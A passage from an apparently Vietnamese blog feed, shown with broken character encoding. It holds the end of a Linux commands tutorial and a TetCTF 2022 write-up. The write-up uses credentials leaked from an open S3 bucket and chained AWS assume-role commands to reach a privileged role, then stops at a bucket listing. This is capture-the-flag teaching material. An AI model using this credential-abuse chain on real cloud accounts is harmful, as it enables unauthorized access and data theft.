      <li>S·ª≠ d·ª•ng option <code class="language-plaintext highlighter-rouge">-d</code> ƒë·ªÉ g·ª≠i data:</li>
    </ul>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-d</span> <span class="o">[</span>data] <span class="o">[</span>URL]
</code></pre></div>    </div>

    <ul>
      <li>V√≠ d·ª• d∆∞·ªõi ƒë√¢y l√† s·ª± k·∫øt h·ª£p c·ªßa c·∫£ 3 options tr√™n:</li>
    </ul>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_6.png" alt="image" /></p>
  </li>
</ul>

<h2 id="ifconfig">ifconfig</h2>

<p>Vi·∫øt t·∫Øt c·ªßa ‚Äúinterface configuration‚Äù (c·∫•u h√¨nh interface), hi·ªÉu r·∫±ng, interface ·ªü ƒë√¢y ch·ªâ c√°c network interface c·ªßa h·ªá th·ªëng</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153538521-630f8643-df81-4fcd-8c79-bf1b93f6ed74.png" alt="image" /></p>

<p>Ta ch√∫ √Ω ƒë·∫øn c√°c c√°i t√™n trong output: <code class="language-plaintext highlighter-rouge">eth0</code> (ethernet), <code class="language-plaintext highlighter-rouge">lo</code> (loopback), <code class="language-plaintext highlighter-rouge">wlan0</code> (wifi), <code class="language-plaintext highlighter-rouge">tun0</code> (VPN)‚Ä¶</p>

<p>·ªû ƒë√¢y ta c√≥ c√°c th√¥ng s·ªë c·ªßa eth0 nh∆∞:</p>

<ul>
  <li>
    <p>MTU: 1500</p>
  </li>
  <li>
    <p>IP: 172.17.0.2 (d√≤ng <code class="language-plaintext highlighter-rouge">inet</code>)</p>
  </li>
</ul>

<p>‚Ä¶</p>

<p>Trong tr∆∞·ªùng h·ª£p ƒë·ªìng th·ªùi c√≥ c·∫£ <code class="language-plaintext highlighter-rouge">eth</code> v√† <code class="language-plaintext highlighter-rouge">wlan</code>, c√≥ th·ªÉ l·ª±a ch·ªçn s·ª≠ d·ª•ng 1 trong 2 b·∫±ng <code class="language-plaintext highlighter-rouge">up</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig <span class="o">[</span>interface] up
</code></pre></div></div>

<p>V√† t·∫•t nhi√™n, ƒë·ªÉ disable m·ªôt c√°i interface n√†o ƒë√≥ th√¨ <code class="language-plaintext highlighter-rouge">down</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig <span class="o">[</span>interface] down
</code></pre></div></div>

<h2 id="grep">grep</h2>

<p>V·ªÅ c∆° b·∫£n, grep gi√∫p ch√∫ng ta t√¨m m·ªôt ƒëo·∫°n vƒÉn b·∫£n trong file, nh∆∞ng khi th·∫≠t s·ª± t√¨m hi·ªÉu, ƒë√¢y l√† m·ªôt ch√¢n tr·ªùi m·ªõi (√≠t nh·∫•t t√¥i th·∫•y v·∫≠y).</p>

<h3 id="syntax-3">Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="o">[</span>options] PATTERNS <span class="o">[</span>files]
</code></pre></div></div>

<h3 id="example-4">Example</h3>

<ul>
  <li>T√¨m file trong th∆∞ m·ª•c hi·ªán t·∫°i c√≥ n·ªôi dung ch·ª©a ‚Äúhello‚Äù:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153550166-18d5883b-2907-4dae-ac47-28b121ee3759.png" alt="image" /></p>

<ul>
  <li>S·ª≠ d·ª•ng option <code class="language-plaintext highlighter-rouge">-R</code> ƒë·ªÉ qu√©t to√†n b·ªô c√°c th∆∞ m·ª•c con:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153550290-5bf3da61-9357-4601-afa0-23d6efeddce9.png" alt="image" /></p>

<ul>
  <li>T√¨m ki·∫øm case insensitive v·ªõi <code class="language-plaintext highlighter-rouge">-i</code>:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153551080-38c1e5ec-0b92-43d5-bd7f-5190bbf7098a.png" alt="image" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">grep</code> v·ªõi regex:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153551315-faf90a5f-a2c5-4239-b322-3a9433bbc7ee.png" alt="image" /></p>

<ul>
  <li>T√¨m ch√≠nh x√°c v·ªõi <code class="language-plaintext highlighter-rouge">-w</code>:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153551628-e0acebbd-b34c-46af-be8c-f1569e9d1185.png" alt="image" /></p>

<ul>
  <li>ƒê·∫øm s·ªë k·∫øt qu·∫£ t√¨m ƒë∆∞·ª£c v·ªõi <code class="language-plaintext highlighter-rouge">-c</code>:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153551783-30460038-b263-4851-9bf5-bed76412dba2.png" alt="image" /></p>

<ul>
  <li>T√¨m ki·∫øm ng∆∞·ª£c (kh√¥ng ch·ª©a t·ª´ ho·∫∑c nh·ªØng t·ª´ tho·∫£ m√£n regex) v·ªõi <code class="language-plaintext highlighter-rouge">-v</code>:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153551985-139d0e06-61fc-4a27-960f-8b0e14013a67.png" alt="image" /></p>

<ul>
  <li>Ch·ªâ hi·ªÉn th·ªã t√™n file ch·ª©a chu·ªói c·∫ßn t√¨m v·ªõi <code class="language-plaintext highlighter-rouge">-l</code>:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153552288-9e0d037b-bdb1-46aa-8cfa-b161c2329c0f.png" alt="image" /></p>

<ul>
  <li>Hi·ªÉn th·ªã s·ªë th·ª© t·ª± c√°c d√≤ng k·∫øt qu·∫£ v·ªõi <code class="language-plaintext highlighter-rouge">-n</code>:</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/82533607/153554903-7a749f5a-9b62-4619-b762-abab0292c43a.png" alt="image" /></p>

<ul>
  <li>Th√™m s·ªë d√≤ng hi·ªÉn th·ªã v·ªõi <code class="language-plaintext highlighter-rouge">-A</code> (after), <code class="language-plaintext highlighter-rouge">-B</code> (before), <code class="language-plaintext highlighter-rouge">-C</code> (circle):</li>
</ul>

<blockquote>
  <p>V√≠ d·ª• ·ªü ƒë√¢y, t√¥i mu·ªën t√¨m d√≤ng ch·ª©a chu·ªói ‚Äúetium‚Äù, nh∆∞ng mu·ªën k·∫øt qu·∫£ in ra ph·∫£i c√≥ c·∫£ 2 d√≤ng d∆∞·ªõi d√≤ng k·∫øt qu·∫£</p>
</blockquote>

<p><img src="https://user-images.githubusercontent.com/82533607/153555492-1b515a82-7ec3-49aa-a027-beaefddc3c48.png" alt="image" /></p>

<h2 id="sudo">sudo</h2>

<blockquote>
  <p>When you are not allowed do something, just ‚Äúsudo‚Äù it!</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="o">[</span>options] <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
</code></pre></div></div>

<p><em><strong>L∆∞u √Ω:</strong></em> mu·ªën d√πng <code class="language-plaintext highlighter-rouge">sudo</code> th√¨ c·∫ßn ph·∫£i n·∫±m trong group <code class="language-plaintext highlighter-rouge">wheel</code> ho·∫∑c <code class="language-plaintext highlighter-rouge">sudo</code> tu·ª≥ t·ª´ng Distro, n·∫øu kh√¥ng s·∫Ω nh∆∞ n√†y:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153557023-9c675ef8-76cf-4c77-9f7a-0bc3aa7ed4c2.png" alt="image" /></p>

<h2 id="su">su</h2>

<p>M∆∞·ª£n quy·ªÅn c·ªßa User kh√°c</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su <span class="o">[</span>options] <span class="o">[</span>- | User | <span class="o">[</span>arguments]]
</code></pre></div></div>

<h3 id="example-5">Example</h3>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">su root</code> = <code class="language-plaintext highlighter-rouge">su</code> = <code class="language-plaintext highlighter-rouge">su -</code>, chuy·ªÉn terminal sang c·ªßa root</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">su &lt;user&gt;</code> chuy·ªÉn terminal sang user kh√°c</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">su -c &lt;command&gt;</code>: ch·∫°y command b·∫±ng quy·ªÅn root</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">su &lt;user&gt; -c &lt;command&gt;</code>: ch·∫°y command b·∫±ng quy·ªÅn c·ªßa user ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh</p>
  </li>
</ul>

<h2 id="chmod">chmod</h2>

<p>V·∫•n ƒë·ªÅ ph·ª©c t·∫°p nh·∫•t trong h·ªá th·ªëng, ph√¢n quy·ªÅn.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> <span class="o">[</span>options] <span class="o">[</span>mode] <span class="o">[</span>file]
</code></pre></div></div>

<p>Tr∆∞·ªõc ti√™n, h√£y nh√¨n v√†o output c·ªßa <code class="language-plaintext highlighter-rouge">ls -l</code>:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153559447-88cee5bb-8800-4f38-b000-d774c590cdaf.png" alt="image" /></p>

<p>T·∫°i c·ªôt ƒë·∫ßu ti√™n c·ªßa output, c√≥ ƒëo·∫°n <code class="language-plaintext highlighter-rouge">-rw-rw-r--</code>, ta t√°ch n√≥ l√†m 4 ƒëo·∫°n:</p>

<table>
  <thead>
    <tr>
      <th>-</th>
      <th>Is directory?</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>rw-</td>
      <td>Owner</td>
    </tr>
    <tr>
      <td>rw-</td>
      <td>Group</td>
    </tr>
    <tr>
      <td>r‚Äì</td>
      <td>Others</td>
    </tr>
  </tbody>
</table>

<p>ƒê√¢y ch√≠nh l√† ph√¢n quy·ªÅn c·ªßa file a.txt, t·ª´ ƒë√¢y ta th·∫•y, Owner (b·∫£n th√¢n user s·ªü h·ªØu n√≥) c√≥ quy·ªÅn read-write, t∆∞·ªüng t·ª± v·ªõi c√°c User trong Group c·ªßa Owner, c√≤n c√°c User kh√°c ch·ªâ c√≥ quy·ªÅn read</p>

<table>
  <thead>
    <tr>
      <th>r</th>
      <th>Read</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>w</td>
      <td>Write</td>
    </tr>
    <tr>
      <td>x</td>
      <td>Excecute</td>
    </tr>
    <tr>
      <td>-</td>
      <td>Not set</td>
    </tr>
  </tbody>
</table>

<p>=&gt; Chu·ªói ph√¢n quy·ªÅn g·ªìm 10 k√≠ t·ª±, chia l√†m 4 c·ª•m, v·ªõi c·ª•m ƒë·∫ßu ti√™n ch·ªâ c√≥ 2 gi√° tr·ªã <code class="language-plaintext highlighter-rouge">-</code>, ho·∫∑c <code class="language-plaintext highlighter-rouge">d</code> ƒë·ªÉ bi·ªÉu th·ªã ƒë·ªëi t∆∞·ª£ng ƒë√≥ c√≥ ph·∫£i l√† directory, hay l√† file. C√≤n l·∫°i 3 c·ª•m l·∫ßn l∆∞·ª£t l√† Owner - Group - Others, m·ªói c·ª•m n√†y ƒë∆∞·ª£c c·∫•u th√†nh t·ª´ 3 k√≠ t·ª± <code class="language-plaintext highlighter-rouge">r</code>, <code class="language-plaintext highlighter-rouge">w</code>, <code class="language-plaintext highlighter-rouge">x</code> ƒë∆∞·ª£c s·∫Øp x·∫øp theo th·ª© t·ª± l√† <code class="language-plaintext highlighter-rouge">rwx</code>, n·∫øu unset quy·ªÅn n√†o, th√¨ quy·ªÅn ƒë√≥ s·∫Ω b·ªã thay th·∫ø b·∫±ng <code class="language-plaintext highlighter-rouge">-</code>.</p>

<p><code class="language-plaintext highlighter-rouge">chmod</code> th∆∞·ªùng ƒë∆∞·ª£c s·ª≠ d·ª•ng v·ªõi c√°c gi√° tr·ªã s·ªë, bi·ªÉu th·ªã cho c√°c quy·ªÅn nh∆∞ sau:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153560612-b423690d-0420-4b19-a8dc-048871530a36.png" alt="image" /></p>

<p>C√°ch ƒë·ªÉ ghi nh·ªõ th√¨ ta g·ªçi 1 l√† set, 0 l√† not set, nh∆∞ v·∫≠y, v√≠ d·ª• v·ªõi quy·ªÅn read and write only, th√¨ chu·ªói quy·ªÅn l√† <code class="language-plaintext highlighter-rouge">rw-</code>, t∆∞∆°ng ƒë∆∞∆°ng v·ªõi <code class="language-plaintext highlighter-rouge">110</code>, chuy·ªÉn qua th·∫≠p ph√¢n l√† <code class="language-plaintext highlighter-rouge">6</code>, t∆∞∆°ng t·ª±, <code class="language-plaintext highlighter-rouge">rwx</code> -&gt; <code class="language-plaintext highlighter-rouge">111</code> = <code class="language-plaintext highlighter-rouge">7</code>.</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153564121-efadf8dc-617a-4a5f-9b6c-0a48077290e5.png" alt="image" /></p>

<p>C√≥ th·ªÉ s·ª≠ d·ª•ng option <code class="language-plaintext highlighter-rouge">-R</code> ƒë·ªÉ set quy·ªÅn cho t·∫•t c·∫£ nh·ªØng th·ª© n·∫±m trong 1 th∆∞ m·ª•c:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/153565667-538b104f-8916-48b6-8533-bedbde1a2aae.png" alt="image" /></p>

<h2 id="chown">chown</h2>

<p>C√°i n√†y ƒë·ªÉ set Owner v√† Group (Ownership) cho c√°c file</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chown</span> <span class="o">[</span>options] <span class="o">[</span>Owner:[Group]] <span class="o">[</span>file]
</code></pre></div></div>

<h3 id="example-6">Example</h3>

<ul>
  <li>Set owner cho a.txt v√†o User <code class="language-plaintext highlighter-rouge">test</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chown test </span>a.txt
</code></pre></div></div>

<ul>
  <li>Set owner cho a.txt v√†o User <code class="language-plaintext highlighter-rouge">test</code> v√† Group <code class="language-plaintext highlighter-rouge">testg</code>:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chown test</span>:testg a.txt
</code></pre></div></div>

<ul>
  <li>Set owner cho to√†n b·ªô folder Docs v√† c√°c subfolders, files b√™n trong:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chown</span> <span class="nt">-R</span> <span class="nb">test</span>:testg Docs/
</code></pre></div></div>

<h2 id="man">man</h2>

<p><code class="language-plaintext highlighter-rouge">man</code> th·ª±c ch·∫•t l√† m·ªôt database ch·ª©a c√°c m√¥ t·∫£ c·ª• th·ªÉ cho c√°c c√¢u l·ªánh.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[Basic linux commands]]></summary></entry><entry><title type="html">TetCTF 2022 | Web Exploitation | Picked onion</title><link href="/2022/01/03/TetCTF-picked-onion.html" rel="alternate" type="text/html" title="TetCTF 2022 | Web Exploitation | Picked onion" /><published>2022-01-03T08:17:00+00:00</published><updated>2022-01-03T08:17:00+00:00</updated><id>/2022/01/03/TetCTF-picked-onion</id><content type="html" xml:base="/2022/01/03/TetCTF-picked-onion.html"><![CDATA[<h1 id="picked-onion">Picked onion</h1>

<p><img src="https://user-images.githubusercontent.com/82533607/147910715-ae6e2f99-a294-4397-88bb-878d50561751.png" alt="chall" /></p>

<h2 id="reconaisance">Reconaisance</h2>

<p>Truy c·∫≠p v√†o URL, ta th·∫•y c√≥ m·ªôt m·ª•c c√≥ t√™n l√† <code class="language-plaintext highlighter-rouge">Secret</code>, th·ª≠ truy c·∫≠p v√† th·∫•y m·ªôt b·ª©c ·∫£nh. Ctrl U (view-source) th√¨ th·∫•y b·ª©c ·∫£nh <code class="language-plaintext highlighter-rouge">href</code> l√† m·ªôt <code class="language-plaintext highlighter-rouge">s3 bucket</code> c√≥ t√™n l√† <code class="language-plaintext highlighter-rouge">secret-tetctf</code>:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147911410-fa0489b2-e116-4a55-8f8c-3ebfe9588b4f.png" alt="secret_img" /></p>

<p>ƒêi·ªÅu ƒë√°ng ch√∫ √Ω ·ªü ƒë√¢y, l√† khi s·ª≠a URL th√†nh <code class="language-plaintext highlighter-rouge">https://secret-tetctf.s3.amazonaws.com/</code> th√¨ ta th·∫•y:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147911956-a3d47c09-f901-4263-8f59-76a4fab0140e.png" alt="first_leak" /></p>

<p>C√≥ th·ªÉ chia l√†m 3 ƒëo·∫°n nh∆∞ sau:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secret-tetctf1000false
I've_Got_a_Secret.jpg2021-12-31T07:12:14.000Z"8176cb55798ee6c7df58496312ca82d8"12949STANDARD
secret2021-12-31T07:15:50.000Z"1ace2f1a8925799880ad32ef47b3e9d9"1239STANDARD
</code></pre></div></div>

<p>ƒê√¢y l√† m·ªôt l·ªói Access Control c·ªßa S3 Bucket, t·∫°i ƒë√¢y, ta c√≥ th·ªÉ th·∫•y c√≤n m·ªôt file <code class="language-plaintext highlighter-rouge">secret</code> n·ªØa, m√¨nh s·∫Ω t·∫£i n√≥ v·ªÅ b·∫±ng URL: <code class="language-plaintext highlighter-rouge">https://secret-tetctf.s3.amazonaws.com/secret</code> v√† ƒë·ªçc n√≥:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147912573-6842e886-3c0d-4e54-a0bf-2e909c343f7e.png" alt="secret_file" /></p>

<p>Ta thu ƒë∆∞·ª£c <code class="language-plaintext highlighter-rouge">AWS_ACCESS_KEY_ID</code>, <code class="language-plaintext highlighter-rouge">AWS_SECRET_ACCESS_KEY</code> v√† <code class="language-plaintext highlighter-rouge">REGION_NAME</code> c·ªßa IAM User ƒë∆∞·ª£c s·ª≠ d·ª•ng cho <code class="language-plaintext highlighter-rouge">dynamodb</code>.</p>

<h2 id="exploit">Exploit</h2>

<p>Ban ƒë·∫ßu khi ƒë·ªçc qua source code th√¨ m√¨nh th·∫•y n√≥ gi·ªëng ho√†n to√†n v·ªõi <a href="https://ctrsec.io/index.php/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app/">b√†i vi·∫øt n√†y</a> c·ªßa anh Chi Tran, nh∆∞ng t·∫•t nhi√™n, n·∫øu v·∫≠y th√¨ ƒë∆°n gi·∫£n qu√°:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147912969-f153ba6d-61a9-491f-8b65-1ee78a979c63.png" alt="fail_1" /></p>

<p>C√≥ th·ªÉ th·∫•y, v·∫•n ƒë·ªÅ ·ªü ƒë√¢y l√† IAM User ddb_user m√† ta ƒëang s·ª≠ d·ª•ng kh√¥ng c√≥ quy·ªÅn h·∫°n g√¨ m·∫•y ƒë·ªÉ th·ª±c hi·ªán exploit nh∆∞ b√†i vi·∫øt ·ªü tr√™n.</p>

<p>Sau m·ªôt h·ªìi l·ª•c l·ªçi tr√™n doc c·ªßa AWS th√¨ m√¨nh th·∫•y ƒëi·ªÅu n√†y:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws iam list-roles
<span class="go">{
    "Roles": [
</span><span class="c">        ...
</span><span class="go">        {
            "Path": "/",
            "RoleName": "CTF_ROLE",
            "RoleId": "AROAXNIS54O****************",
            "Arn": "arn:aws:iam::************:role/CTF_ROLE",
            "CreateDate": "2021-12-29T15:30:56Z",
            "AssumeRolePolicyDocument": {
                "Version": "2008-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "*"
                        },
                        "Action": "sts:AssumeRole",
                        "Condition": {
                            "StringLike": {
                                "aws:PrincipalArn": "arn:aws:iam::*:role/*-Accessing_Tet_CTF_Flag*"
                            }
                        }
                    }
                ]
            },
            "Description": "CTF_ROLE",
            "MaxSessionDuration": 3600
        }
    ]
}

</span></code></pre></div></div>

<p>C√πng hi·ªÉu m·ªôt ch√∫t v·ªÅ ƒëo·∫°n JSON ·ªü tr√™n nh√©?</p>

<p>ƒê√¢y l√† m·ªôt policy cho vi·ªác AssumeRole, ta thu ƒë∆∞·ª£c kh√° nhi·ªÅu th√¥ng tin, ƒë·∫∑c bi·ªát nh·∫•t l√† Condittion cho vi·ªác AssumeRole, ƒë√≥ l√† chu·ªói PrincipalArn trong request ph·∫£i ch·ª©a m·ªôt chu·ªói <code class="language-plaintext highlighter-rouge">&lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt;</code>, c·ª• th·ªÉ h∆°n th√¨ ch√≠nh x√°c c√°i user g·ª≠i request AssumeRole ph·∫£i mang m·ªôt IAM Role c√≥ t√™n v·ªõi ƒë·ªãnh d·∫°ng k·ªÉ tr√™n, nh∆∞ v·∫≠y, ƒë·ªÉ th·ª±c hi·ªán exploit, ta c·∫ßn:</p>

<ul>
  <li>
    <p>T·∫°o m·ªôt IAM User.</p>
  </li>
  <li>
    <p>T·∫°o m·ªôt IAM Role c√≥ t√™n d∆∞·ªõi d·∫°ng <code class="language-plaintext highlighter-rouge">&lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt;</code> m√† IAM User v·ª´a t·∫°o c√≥ th·ªÉ AssumeRole ƒë∆∞·ª£c.</p>
  </li>
  <li>
    <p>AssumeRole <code class="language-plaintext highlighter-rouge">&lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt;</code> v√†o IAM User ƒë√£ t·∫°o v√† l∆∞u c√°c creditials ƒë∆∞·ª£c tr·∫£ v·ªÅ.</p>
  </li>
  <li>
    <p>AssumeRole <code class="language-plaintext highlighter-rouge">CTF_ROLE</code> ·ªü tr√™n v√† IAM User ƒë√£ t·∫°o, l∆∞u l·∫°i creditials ƒë∆∞·ª£c tr·∫£ v·ªÅ.</p>
  </li>
</ul>

<p>Gi·∫£i th√≠ch l·∫°i m·ªôt ch√∫t v·ªÅ ARN trong AWS, ARN l√† m·ªôt chu·ªói c√≥ d·∫°ng: <code class="language-plaintext highlighter-rouge">arn:partition:service:region:account:resource</code>, khi IAM User g·ª≠i b·∫•t k√¨ request n√†o c√≥ y√™u c·∫ßu credential, c√°c chu·ªói ARN s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒëi, v√† ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng c√°c chu·ªói ARN n√†y ƒë·ªÉ vi·∫øt policy ph√¢n quy·ªÅn theo IAM Role cho c√°c IAM User v·ªõi ƒëi·ªÅu ki·ªán c·ª• th·ªÉ.</p>

<p>Quay l·∫°i v·ªõi v·∫•n ƒë·ªÅ ch√≠nh, v√¨ kh√¥ng c√≥ AWS account ƒë·ªÉ t·∫°o IAM User n√™n m√¨nh ƒë√£ inbox m∆∞·ª£n anh Chi Tran m·ªôt IAM User.</p>

<p>S·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">aws configure</code> v√† ƒëi·ªÅn c√°c th√¥ng tin v√†o:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws configure
<span class="go">AWS Access Key ID [********************]: AKIAXNIS************
AWS Secret Access Key [********************]: VmK2ZWUVZ************************
Default region name [us-east-1]: 
Default output format [json]: 
</span></code></pre></div></div>

<p>Sau ƒë√≥, t·∫°o m·ªôt file <code class="language-plaintext highlighter-rouge">Trust-policy.json</code>, s·ª≠ d·ª•ng l√†m Policy cho Role m·ªõi (ƒë·ª´ng l√†m theo ·ªü th·ª±c t·∫ø, v√¨ l√Ω do b·∫£o m·∫≠t):</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">allow</span><span class="w"> </span><span class="err">all</span><span class="p">,</span><span class="w"> </span><span class="err">no</span><span class="w"> </span><span class="err">condittion</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Condition"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>V√† s·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">aws iam create-role --role-name &lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt; --assume-role-policy-document file://Trust-policy.json</code> ƒë·ªÉ t·∫°o Role, nh·ªõ note l·∫°i ARN ·ªü output</p>

<p>AssumeRole:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws sts assume-role <span class="nt">--role-arn</span> <span class="s2">"arn:aws:iam::***************:role/&lt;anything&gt;-Accessing_Tet_CTF_Flag&lt;anything&gt;"</span> <span class="nt">--role-session-name</span> &lt;anyname&gt;
<span class="go">{
    "Credentials": {
        "AccessKeyId": "access_key_id_here",
        "SecretAccessKey": "secret_access_key_here",
        "SessionToken": "long_token_here",
        "Expiration": "2022-01-03T09:02:51Z"
    },
    "AssumedRoleUser": {
</span><span class="gp">        "AssumedRoleId": "******************:&lt;anyname&gt;</span><span class="s2">",
</span><span class="gp">        "Arn": "arn:aws:sts::***************:assumed-role/&lt;anything&gt;</span><span class="s2">-Accessing_Tet_CTF_Flag&lt;anything&gt;/&lt;anyname&gt;"</span>
<span class="go">    }
}
</span></code></pre></div></div>

<p>L∆∞u credential v√†o Env:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>&lt;<span class="s2">"AccessKeyId"</span><span class="o">&gt;</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>&lt;<span class="s2">"SecretAccessKey"</span><span class="o">&gt;</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>&lt;<span class="s2">"SessionToken"</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Ti·∫øn h√†nh AssumeRole <code class="language-plaintext highlighter-rouge">CTF_ROLE</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws sts assume-role <span class="nt">--role-arn</span> <span class="s2">"arn:aws:iam::***************:role/CTF_ROLE"</span> <span class="nt">--role-session-name</span> &lt;anyname&gt;
<span class="go">{
    "Credentials": {
        "AccessKeyId": "access_key_id_here",
        "SecretAccessKey": "secret_access_key_here",
        "SessionToken": "long_token_here",
        "Expiration": "2022-01-03T09:02:51Z"
    },
    "AssumedRoleUser": {
</span><span class="gp">        "AssumedRoleId": "******************:&lt;anyname&gt;</span><span class="s2">",
</span><span class="gp">        "Arn": "arn:aws:sts::***************:assumed-role/CTF_ROLE/&lt;anyname&gt;</span><span class="s2">"</span>
<span class="go">    }
}
</span></code></pre></div></div>

<p>V√† l·∫°i l∆∞u credentials:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>&lt;<span class="s2">"AccessKeyId"</span><span class="o">&gt;</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>&lt;<span class="s2">"SecretAccessKey"</span><span class="o">&gt;</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>&lt;<span class="s2">"SessionToken"</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>L√∫c n√†y, ta ƒë√£ c√≥ Role CTF_ROLE, n·∫øu ch∆∞a ch·∫Øc ch·∫Øn, c√≥ th·ªÉ ki·ªÉm tra b·∫±ng <code class="language-plaintext highlighter-rouge">aws sts get-caller-identity</code>, n·∫øu th·∫•y CTF_ROLE th√¨ ƒë√£ th√†nh c√¥ng.</p>

<p>Ti·∫øn h√†nh list c√°c bucket:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws s3api list-buckets <span class="nt">--query</span> <span class="s2">"Buckets[].Name"</span>
<span class="go">[
    "secret-tetctf",
    "tet-ctf-secret"
]
</span></code></pre></div></div>

